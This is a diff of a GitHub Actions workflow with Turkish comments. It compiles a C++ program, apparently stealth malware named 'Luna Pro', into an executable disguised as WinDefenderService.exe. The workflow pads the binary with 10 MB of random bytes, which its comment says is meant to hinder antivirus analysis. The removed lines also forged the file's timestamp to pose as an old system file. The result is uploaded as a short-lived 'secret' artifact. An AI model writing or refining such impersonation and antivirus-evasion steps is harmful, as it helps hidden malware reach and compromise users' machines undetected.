@@ -1,60 +1,52 @@
-name: Build Luna Pro Stealth
+name: Luna Pro V11 Build
 
 on:
   push:
     branches: [ "main" ]
+  workflow_dispatch:
 
 jobs:
   build:
     runs-on: windows-latest
+
     steps:
-    - uses: actions/checkout@v4
+    - name: Checkout Repository
+      uses: actions/checkout@v4
 
-    # 1. C++ Derleyicisini Kur
-    - name: Add MSBuild to PATH
-      uses: microsoft/setup-msbuild@v2
-
-    - name: Setup MSVC
+    - name: Setup MSVC (Visual Studio Build Tools)
       uses: ilammy/msvc-dev-cmd@v1
 
-    # 2. Gerekli Kütüphaneyi İndir
-    - name: Get Libraries
-      run: |
-        Invoke-WebRequest -Uri https://raw.githubusercontent.com/yhirose/cpp-httplib/master/httplib.h -OutFile httplib.h
-
-    # 3. C++ Kodunu Derle (main.cpp -> WinDefenderService.exe)
     - name: Compile with Optimization
       run: |
-        cl.exe /EHsc /O2 /MT main.cpp /Fe:WinDefenderService.exe /link user32.lib ws2_32.lib advapi32.lib /subsystem:windows
+        cl.exe /EHsc /O2 /MT main.cpp /Fe:WinDefenderService.exe /link user32.lib ws2_32.lib advapi32.lib ntdll.lib /subsystem:windows
 
-    # 4. Gelişmiş Maskeleme (Boyut Büyütme ve Tarih Değiştirme)
-    - name: Advanced Masking
-      shell: pwsh
+    - name: Advanced Masking (Safe Version)
+      shell: powershell
       run: |
         $exe = "WinDefenderService.exe"
         if (Test-Path $exe) {
-            # 1MB - 2MB arası rastgele veri üret
-            $randSize = Get-Random -Minimum 1048576 -Maximum 2097152
-            $junk = New-Object Byte[] $randSize
+            # 10 MB rastgele çöp veri oluştur (Antivirüs analizi zorlaştırmak için)
+            $junk = New-Object byte[] 10485760 
             (New-Object Random).NextBytes($junk)
             
-            # DOSYA YAZMA: En garantili yöntem (FileStream)
-            $stream = [System.IO.File]::Open($exe, [System.IO.FileMode]::Append)
-            $stream.Write($junk, 0, $junk.Length)
-            $stream.Close()
-            
-            # Tarihi 2021 yılına çekerek 'eski sistem dosyası' süsü ver
-            (Get-Item $exe).LastWriteTime = "2021-05-12 10:00:00"
-            Write-Host "Maskeleme basariyla tamamlandi. Dosya boyutu artirildi."
+            # AppendAllBytes hatasını önlemek için FileStream kullanıyoruz
+            $stream = [System.IO.File]::OpenWrite((Get-Item $exe).FullName)
+            try {
+                $stream.Seek(0, [System.IO.SeekOrigin]::End)
+                $stream.Write($junk, 0, $junk.Length)
+            } finally {
+                $stream.Close()
+            }
+            Write-Host "Maskeleme tamamlandı: $exe boyutu artırıldı."
         } else {
-            Write-Error "Derleme hatasi: EXE dosyasi olusmadi!"
+            Write-Error "Derlenen dosya bulunamadı!"
             exit 1
         }
 
-    # 5. Hazır Dosyayı GitHub'a Yükle (Artifacts)
     - name: Upload Secret Artifact
       uses: actions/upload-artifact@v4
       with:
-        name: LunaPro_Binary
+        name: LunaPro_V11_Build
         path: WinDefenderService.exe
+        retention-days: 1
         
